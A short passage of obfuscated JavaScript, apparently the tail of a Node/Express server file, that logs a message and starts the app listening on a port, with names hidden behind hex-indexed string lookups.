_0x19cf29=_0x25a3f8;console[_0x19cf29(0x179)](_0x19cf29(0x1b8),_0x27ea5a);}),app[_0x25a3f8(0x1ce)](PORT,()=>console[_0x25a3f8(0x1b5)](_0x25a3f8(0x11d)+PORT+'!'));
